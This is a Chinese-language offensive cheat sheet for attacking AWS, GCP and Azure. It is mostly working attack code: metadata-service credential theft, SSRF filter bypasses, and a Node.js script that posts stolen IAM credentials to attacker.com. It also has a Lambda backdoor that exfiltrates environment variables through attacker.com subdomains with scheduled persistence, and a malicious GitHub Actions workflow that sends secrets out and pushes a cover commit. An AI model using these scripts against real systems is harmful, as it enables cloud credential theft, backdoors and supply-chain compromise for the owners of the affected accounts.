# 云服务攻击 (Cloud Services Attacks)

## 原理

攻击 AWS/GCP/Azure 等云服务的配置错误、IAM 权限过大、元数据服务、Serverless 函数等。

## 攻击链

### 1. AWS 攻击

#### 元数据服务

```bash
# IMDSv1（旧版，直接访问）
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>/
# 返回 AccessKeyId, SecretAccessKey, Token

# IMDSv2（新版，需要 Token）
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# 用户数据
curl http://169.254.169.254/latest/user-data
```

#### 使用凭证

```bash
# 配置 AWS CLI
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>

# 列出 S3
aws s3 ls
aws s3 ls s3://bucket-name

# 列出 EC2
aws ec2 describe-instances

# 列出 IAM
aws iam list-users
aws iam list-roles
aws iam get-role --role-name <role>

# 列出 Lambda
aws lambda list-functions
```

#### S3 攻击

```bash
# 列出 bucket
aws s3 ls s3://bucket-name --no-sign-request  # 匿名访问

# 上传文件
aws s3 cp file.txt s3://bucket-name/

# 下载文件
aws s3 cp s3://bucket-name/file.txt ./
```

#### Lambda 攻击

```bash
# 列出函数
aws lambda list-functions

# 获取函数代码
aws lambda get-function --function-name <name>

# 调用函数
aws lambda invoke --function-name <name> output.txt

# 注入恶意代码
# 修改 Lambda 函数代码
```

#### IAM 提权

```bash
# 常见提权路径
# 1. iam:CreateAccessKey - 为其他用户创建密钥
# 2. iam:AttachRolePolicy - 给角色附加管理员策略
# 3. iam:PutRolePolicy - 修改角色策略
# 4. lambda:CreateFunction + lambda:InvokeFunction - 创建恶意函数
# 5. sts:AssumeRole - 切换到高权限角色

# 列出策略
aws iam list-policies
aws iam list-attached-role-policies --role-name <role>

# 创建访问密钥
aws iam create-access-key --user-name <user>
```

### 2. GCP 攻击

#### 元数据服务

```bash
# 需要 Metadata-Flavor header
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# 获取 token
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# 获取项目信息
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/

# 获取实例信息
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/
```

#### 使用凭证

```bash
# 配置 gcloud
gcloud auth login
gcloud config set project <project-id>

# 列出 Compute Engine
gcloud compute instances list

# 列出 Storage
gsutil ls
gsutil ls gs://bucket-name

# 列出 Cloud Functions
gcloud functions list
```

#### Cloud Storage 攻击

```bash
# 列出 bucket
gsutil ls gs://bucket-name

# 上传文件
gsutil cp file.txt gs://bucket-name/

# 下载文件
gsutil cp gs://bucket-name/file.txt ./
```

#### Cloud Functions 攻击

```bash
# 列出函数
gcloud functions list

# 获取函数代码
gcloud functions describe <function-name>

# 调用函数
gcloud functions call <function-name>
```

### 3. Azure 攻击

#### 元数据服务

```bash
# 需要 Metadata header
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"

# 获取 token
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

#### 使用凭证

```bash
# 配置 az
az login
az account set --subscription <subscription-id>

# 列出 VM
az vm list

# 列出 Storage
az storage account list
```

### 4. SSRF 到云服务

```python
# 通过 SSRF 访问元数据服务
import requests

# AWS
r = requests.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>/')
print(r.json())

# GCP
r = requests.get('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', 
                 headers={'Metadata-Flavor': 'Google'})
print(r.json())

# Azure
r = requests.get('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
                 headers={'Metadata': 'true'})
print(r.json())
```

### 5. Serverless 攻击

#### AWS Lambda

```bash
# Lambda 注入
# 通过 API Gateway 触发 Lambda
# 注入恶意代码

# 环境变量泄露
# Lambda 环境变量可能包含敏感信息
```

#### GCP Cloud Functions

```bash
# 类似 Lambda
# 通过 HTTP 触发
# 注入恶意代码
```

### 6. 容器服务攻击

#### AWS ECS

```bash
# ECS 任务定义
# 可能包含敏感信息
aws ecs describe-task-definition --task-definition <name>
```

#### AWS EKS

```bash
# EKS 是 AWS 的 K8s 服务
# 结合 K8s 攻击和 AWS 攻击
```

### 7. 数据库服务攻击

#### AWS RDS

```bash
# RDS 数据库
# 可能包含敏感信息
aws rds describe-db-instances
aws rds describe-db-snapshots
```

#### AWS DynamoDB

```bash
# DynamoDB 表
aws dynamodb list-tables
aws dynamodb scan --table-name <table-name>
```

## 2024-2026 新技术点

### 1. IMDSv2 SSRF 绕过

```python
# IMDSv2 绕过技术：利用 PUT 请求获取 Token 后窃取凭证
# 适用于 SSRF 漏洞利用场景

import requests

class AWSIMDSv2Bypass:
    """通过 SSRF 绕过 IMDSv2 获取 IAM 凭证"""
    
    METADATA = "http://169.254.169.254"
    
    @staticmethod
    def get_token(ssrf_func):
        """通过 SSRF 注入 PUT 请求获取 IMDSv2 Token"""
        # 绕过方式 1: 如果 SSRF 允许自定义 HTTP 方法
        token_url = f"{AWSIMDSv2Bypass.METADATA}/latest/api/token"
        headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
        # 通过 SSRF 代理发送 PUT 请求
        token = ssrf_func(token_url, method="PUT", headers=headers)
        return token
    
    @staticmethod
    def get_credentials(ssrf_func, token):
        """使用 Token 获取 IAM 凭证"""
        cred_url = f"{AWSIMDSv2Bypass.METADATA}/latest/meta-data/iam/security-credentials/"
        headers = {"X-aws-ec2-metadata-token": token}
        role = ssrf_func(cred_url, headers=headers)
        
        cred_url = f"{AWSIMDSv2Bypass.METADATA}/latest/meta-data/iam/security-credentials/{role}"
        return ssrf_func(cred_url, headers=headers)
    
    @staticmethod
    def bypass_via_url_encoding(target_url):
        """URL 编码绕过 SSRF 过滤"""
        bypasses = [
            # IP 编码变体
            "http://0x7f000001/latest/meta-data/",
            "http://2130706433/latest/meta-data/",
            "http://0177.0.0.1/latest/meta-data/",
            "http://127.1/latest/meta-data/",
            "http://[::1]/latest/meta-data/",
            # DNS 重绑定
            "http://169.254.169.254.nip.io/latest/meta-data/",
            # URL 特殊字符
            "http://169.254.169.254%00./latest/meta-data/",
            "http://169.254.169.254@attacker.com/latest/meta-data/",
        ]
        return bypasses

# 利用示例：通过 Node.js SSRF 获取 AWS 凭证
ssrf_exploit = """
// Node.js SSRF → IMDSv2 凭证窃取
async function stealCredentials() {
    // Step 1: 获取 IMDSv2 Token (PUT 请求)
    const tokenRes = await fetch('http://169.254.169.254/latest/api/token', {
        method: 'PUT',
        headers: {'X-aws-ec2-metadata-token-ttl-seconds': '21600'}
    });
    const token = await tokenRes.text();
    
    // Step 2: 使用 Token 获取 IAM 角色
    const roleRes = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
        headers: {'X-aws-ec2-metadata-token': token}
    });
    const role = await roleRes.text();
    
    // Step 3: 获取完整凭证
    const credRes = await fetch(
        `http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`,
        {headers: {'X-aws-ec2-metadata-token': token}}
    );
    const creds = await credRes.json();
    
    // Step 4: 外带凭证
    await fetch('https://attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(creds)
    });
}
"""
```

### 2. Serverless Lambda 环境变量注入

```python
# Lambda 冷启动注入 + 环境变量窃取

import boto3
import json
import zipfile
import io

class LambdaExploit:
    """AWS Lambda 攻击工具集"""
    
    def __init__(self, access_key, secret_key, session_token=None):
        self.session = boto3.Session(
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key,
            aws_session_token=session_token
        )
        self.lambda_client = self.session.client('lambda')
    
    def enumerate_functions(self):
        """枚举所有 Lambda 函数及其环境变量"""
        results = []
        paginator = self.lambda_client.get_paginator('list_functions')
        for page in paginator.paginate():
            for func in page['Functions']:
                config = self.lambda_client.get_function_configuration(
                    FunctionName=func['FunctionName']
                )
                env_vars = config.get('Environment', {}).get('Variables', {})
                results.append({
                    'name': func['FunctionName'],
                    'runtime': func['Runtime'],
                    'role': func.get('Role', 'N/A'),
                    'env_vars': env_vars,  # 可能包含数据库密码、API 密钥等
                    'vpc_config': config.get('VpcConfig', {}),
                })
                # 检查危险环境变量
                for key, val in env_vars.items():
                    if any(kw in key.lower() for kw in ['password', 'secret', 'key', 'token', 'db']):
                        print(f"[!] 发现敏感变量: {func['FunctionName']}.{key} = {val}")
        return results
    
    def inject_backdoor(self, function_name):
        """注入后门代码到 Lambda 函数"""
        backdoor_code = '''
import os, json, base64, urllib.request

def handler(event, context):
    # 原始逻辑（如果需要）
    try:
        result = original_handler(event, context)
    except:
        result = {"statusCode": 200, "body": "OK"}
    
    # 后门：窃取环境变量并外带
    env_data = {}
    for k, v in os.environ.items():
        env_data[k] = v
    
    # 通过 DNS 外带（绕过 HTTPS 限制）
    encoded = base64.b64encode(json.dumps(env_data).encode()).decode()
    # 分块发送
    chunk_size = 50
    for i in range(0, len(encoded), chunk_size):
        chunk = encoded[i:i+chunk_size]
        try:
            urllib.request.urlopen(f"https://{chunk}.attacker.com/exfil", timeout=5)
        except:
            pass
    
    return result

def original_handler(event, context):
    return {"statusCode": 200, "body": "OK"}
'''
        # 下载当前代码
        response = self.lambda_client.get_function(FunctionName=function_name)
        
        # 创建带后门的 zip
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('lambda_function.py', backdoor_code)
        zip_buffer.seek(0)
        
        # 上传
        self.lambda_client.update_function_code(
            FunctionName=function_name,
            ZipFile=zip_buffer.read()
        )
        print(f"[+] 已注入后门到 {function_name}")
    
    def create_persistence(self, trigger_event_rule):
        """通过 EventBridge 规则创建持久化后门"""
        events_client = self.session.client('events')
        
        # 创建定时触发器
        events_client.put_rule(
            Name='maintain-access',
            ScheduleExpression='rate(5 minutes)',
            State='ENABLED',
            Description='Backdoor maintenance'
        )
```

### 3. GCP Service Account 凭证窃取

```bash
# GCP 元数据服务利用
# 从容器内窃取 GCP Service Account 凭证

# 获取默认 SA token
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# 获取 SA email
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# 列出所有 SA
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"

# 使用 gcloud 利用泄露的凭证
python3 << 'PYEOF'
import requests
import json

# 获取 access token
token_resp = requests.get(
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    headers={"Metadata-Flavor": "Google"}
).json()

token = token_resp["access_token"]
headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

# 枚举项目
r = requests.get(
    "https://cloudresourcemanager.googleapis.com/v1/projects",
    headers=headers
)
print(f"[*] 项目列表: {json.dumps(r.json(), indent=2)[:500]}")

# 枚举 IAM 策略
project_id = r.json().get('projects', [{}])[0].get('projectId', '')
if project_id:
    r = requests.get(
        f"https://cloudresourcemanager.googleapis.com/v1/projects/{project_id}:getIamPolicy",
        headers=headers
    )
    print(f"[*] IAM 策略: {json.dumps(r.json(), indent=2)[:500]}")

# 尝试创建 Service Account Key（如果权限允许）
sa_email = requests.get(
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
    headers={"Metadata-Flavor": "Google"}
).text

try:
    r = requests.post(
        f"https://iam.googleapis.com/v1/projects/-/serviceAccounts/{sa_email}:createKey",
        headers=headers,
        json={"privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE"}
    )
    if r.status_code == 200:
        print(f"[+] 成功创建 SA key: {r.json().get('name')}")
except Exception as e:
    print(f"[-] 创建 key 失败: {e}")
PYEOF
```

### 4. Azure Managed Identity 利用

```bash
# Azure 元数据服务 — 通过容器获取 Managed Identity Token

# 获取 Access Token（需要 Metadata: true header）
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r '.access_token')

# 获取 Identity Info
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01"

# 使用 Token 枚举订阅
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# 尝试读取 Key Vault
python3 << 'PYEOF'
import requests
import json

# 获取 token
token = requests.get(
    "http://169.254.169.254/metadata/identity/oauth2/token",
    params={"api-version": "2018-02-01", "resource": "https://vault.azure.net"},
    headers={"Metadata": "true"}
).json()["access_token"]

headers = {"Authorization": f"Bearer {token}"}

# 枚举 Key Vault（需要知道名称）
vaults = requests.get(
    "https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.KeyVault/vaults",
    params={"api-version": "2022-07-01"},
    headers={"Authorization": f"Bearer {requests.get('http://169.254.169.254/metadata/identity/oauth2/token', params={'api-version': '2018-02-01', 'resource': 'https://management.azure.com/'}, headers={'Metadata': 'true'}).json()['access_token']}"}
).json()

print(f"[*] Key Vaults: {json.dumps(vaults, indent=2)[:500]}")
PYEOF
```

### 5. 云存储 Bucket 爆破与数据泄露

```bash
# S3 Bucket 爆破
python3 << 'PYEOF'
import boto3
from itertools import product
import string

def bruteforce_s3():
    """爆破 S3 bucket 名称"""
    s3 = boto3.client('s3', region_name='us-east-1')
    
    prefixes = ['test', 'dev', 'prod', 'backup', 'data', 'log', 'config']
    suffixes = ['', '-backup', '-logs', '-data', '-config', '-prod', '-dev']
    
    found = []
    for prefix in prefixes:
        for suffix in suffixes:
            name = f"{prefix}{suffix}"
            try:
                s3.head_bucket(Bucket=name)
                print(f"[+] Bucket 存在: {s3.meta.endpoint_url}/{name}")
                # 尝试列出内容
                objects = s3.list_objects_v2(Bucket=name, MaxKeys=10)
                for obj in objects.get('Contents', []):
                    print(f"    文件: {obj['Key']} ({obj['Size']} bytes)")
                found.append(name)
            except:
                pass
    
    # 暴力枚举（小范围）
    for combo in product(string.ascii_lowercase, repeat=3):
        name = f"ctf-{''.join(combo)}"
        try:
            s3.head_bucket(Bucket=name)
            print(f"[+] Bucket: {name}")
        except:
            pass
    
    return found

# GCS Bucket 列表（匿名访问）
import requests
def check_gcs_bucket(name):
    r = requests.get(f"https://storage.googleapis.com/{name}/?maxResults=10")
    if r.status_code == 200:
        print(f"[+] GCS Bucket 可访问: {name}")
        return True
    return False

# Azure Blob 访问
def check_azure_blob(account, container):
    r = requests.get(f"https://{account}.blob.core.windows.net/{container}?restype=container&comp=list")
    if r.status_code == 200 and 'EnumerationResults' in r.text:
        print(f"[+] Azure Container 可访问: {account}/{container}")
        return True
    return False
PYEOF
```

### 6. 多云横向移动

```python
# 跨云权限提升：利用一个云平台的凭证访问另一个云平台
# 常见场景：凭证复用、跨云部署、SSO 集成

import requests
import json

class MultiCloudPivot:
    """多云横向移动框架"""
    
    @staticmethod
    def aws_to_gcp_via_oidc(aws_creds, gcp_project):
        """利用 AWS → GCP OIDC 互信进行跨云移动"""
        # 如果 GCP Workload Identity Federation 信任 AWS
        # 可以用 AWS 凭证获取 GCP token
        pass
    
    @staticmethod
    def detect_credential_reuse(creds):
        """检测凭证复用"""
        findings = []
        
        # 检查 AWS Secret Key 格式
        if 'AKIA' in str(creds.get('aws_access_key_id', '')):
            findings.append("AWS credential detected - check for GCP/Azure reuse")
        
        # 检查 GCP service account key
        if 'type' in str(creds) and 'service_account' in str(creds):
            findings.append("GCP SA key - check for cross-cloud trust")
        
        return findings
    
    @staticmethod
    def exploit_cross_cloud_trust(cloud_a_session, cloud_b_target):
        """利用跨云信任关系"""
        # 场景 1: AWS Role → GCP Workload Identity
        # 场景 2: Azure AD → AWS SSO
        # 场景 3: GCP Service Account → GitHub Actions → AWS
        pass
```

### 7. 云原生供应链攻击

```bash
# 利用 CI/CD 管道中的云凭证
# 常见：GitHub Actions secrets、GitLab CI variables

# GitHub Actions 中的凭证窃取
python3 << 'PYEOF'
import requests
import json

# 如果可以注入 GitHub Actions 工作流
malicious_workflow = """
name: Backdoor
on: push
jobs:
  steal-secrets:
    runs-on: ubuntu-latest
    steps:
    - name: Steal secrets
      run: |
        # 窃取 GitHub secrets
        echo "${{ secrets.AWS_ACCESS_KEY_ID }}" > /tmp/stolen.txt
        echo "${{ secrets.AWS_SECRET_ACCESS_KEY }}" >> /tmp/stolen.txt
        echo "${{ secrets.GCP_SA_KEY }}" >> /tmp/stolen.txt
        echo "${{ secrets.DATABASE_URL }}" >> /tmp/stolen.txt
        
        # 外带
        curl -X POST https://attacker.com/collect \
          -d @/tmp/stolen.txt
        
        # 创建持久化 - 修改工作流
        git config user.name "CI Bot"
        git config user.email "bot@company.com"
        cat > .github/workflows/ci.yml << 'WF'
name: Normal CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - run: echo "Normal build"
WF
        git add .github/workflows/
        git commit -m "Update CI config"
        git push
"""

# 利用 Terraform state 中的凭证
# Terraform state 文件可能包含明文密码
print("[*] 检查 Terraform state 中的敏感信息")
# terraform.tfstate 可能包含：
# - 数据库密码
# - API 密钥
# - 私钥
# - 访问令牌
PYEOF
```

### 8. 容器云 Runtime 新攻击 (ECS/Cloud Run/Container Apps)

```bash
# AWS ECS 任务定义中的敏感信息泄露
aws ecs list-task-definitions | \
  jq -r '.taskDefinitionArns[]' | \
  while read arn; do
    echo "[*] 检查: $arn"
    aws ecs describe-task-definition --task-definition $arn | \
      jq '.taskDefinition.containerDefinitions[]? | {
        name, image, environment, secrets
      }'
done

# GCP Cloud Run — 通过元数据获取凭证
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

# Azure Container Apps — 通过 Managed Identity 获取 Token
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | \
  jq -r '.access_token'

# 利用 ECS 任务角色横向移动
python3 << 'PYEOF'
import boto3

# ECS 任务可能有比预期更宽的 IAM 角色
session = boto3.Session()

# 列出可以访问的资源
ecs = session.client('ecs')
tasks = ecs.list_tasks()['taskArns']

for task_arn in tasks[:5]:
    task = ecs.describe_tasks(cluster='default', tasks=[task_arn])['tasks'][0]
    print(f"[*] Task: {task_arn}")
    print(f"    Role: {task.get('taskDefinitionArn')}")
    
    # 检查任务定义中的环境变量和 secrets
    def_arn = task['taskDefinitionArn']
    def_detail = ecs.describe_task_definition(taskDefinition=def_arn)['taskDefinition']
    
    for container in def_detail['containerDefinitions']:
        for env in container.get('environment', []):
            if any(kw in env['name'].lower() for kw in ['password', 'secret', 'key', 'token']):
                print(f"    [!] 敏感环境变量: {env['name']}={env['value']}")
        for secret in container.get('secrets', []):
            print(f"    [*] Secrets 引用: {secret['name']} -> {secret['valueFrom']}")
PYEOF
```

### 9. AI/ML 云服务攻击

```bash
# AWS SageMaker — 通过 Notebook 实例访问训练数据和模型
# 获取 SageMaker 执行角色凭证
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | \
  while read role; do
    echo "[*] Role: $role"
    curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$role
done

# GCP Vertex AI — 模型窃取
python3 << 'PYEOF'
import requests
import json

# 获取 GCP token
token = requests.get(
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    params={"scope": "https://www.googleapis.com/auth/cloud-platform"},
    headers={"Metadata-Flavor": "Google"}
).json()["access_token"]

headers = {"Authorization": f"Bearer {token}"}

# 列出 Vertex AI 模型
r = requests.get(
    "https://us-central1-aiplatform.googleapis.com/v1/projects/{project}/locations/us-central1/models",
    headers=headers
)
print(f"[*] 模型列表: {json.dumps(r.json(), indent=2)[:500]}")

# 列出训练数据
r = requests.get(
    "https://storage.googleapis.com/storage/v1/b?project={project}",
    headers=headers
)
for bucket in r.json().get('items', []):
    print(f"[*] Bucket: {bucket['name']}")
PYEOF
```

### 10. 云环境自动化审计扫描

```bash
# Prowler — AWS 安全审计
prowler aws --checks check_1_check_arguments check_2_1_11

# ScoutSuite — 多云审计
scout aws --profile attacker-profile
scout gcp --user-account --service-account --project-id target-project

# CloudSploit — 云配置检查
# 检查 S3 bucket 公开访问
# 检查 IAM 策略过度权限
# 检查安全组规则

# 自动化枚举脚本
python3 << 'PYEOF'
import subprocess
import json

class CloudAuditor:
    """多云自动化审计"""
    
    def audit_aws(self, profile='default'):
        """AWS 安全审计"""
        checks = {
            # IAM 检查
            'iam-users': 'aws iam list-users --output json',
            'iam-policies': 'aws iam list-policies --scope Local --output json',
            'iam-roles': 'aws iam list-roles --output json',
            # S3 检查
            's3-buckets': 'aws s3api list-buckets --output json',
            # EC2 检查
            'ec2-public': 'aws ec2 describe-instances --filters "Name=ip-address" --output json',
            # Lambda 检查
            'lambda': 'aws lambda list-functions --output json',
        }
        
        for name, cmd in checks.items():
            try:
                result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=30)
                data = json.loads(result.stdout)
                print(f"[+] {name}: {json.dumps(data)[:200]}")
            except Exception as e:
                print(f"[-] {name}: {e}")

auditor = CloudAuditor()
auditor.audit_aws()
PYEOF
```

## 工具推荐

- **awscli** — AWS CLI
- **gcloud** — GCP CLI
- **az** — Azure CLI
- **Prowler** — AWS 安全审计
- **ScoutSuite** — 多云审计
- **CloudSploit** — 云安全扫描
- **LolrusLove** — 云提权工具

## 参考链接

- [Cloud Security](https://book.hacktricks.xyz/cloud-security)
- [Prowler](https://github.com/prowler-cloud/prowler)
- [ScoutSuite](https://github.com/nccgroup/ScoutSuite)
- [AWS Security](https://aws.amazon.com/security/)
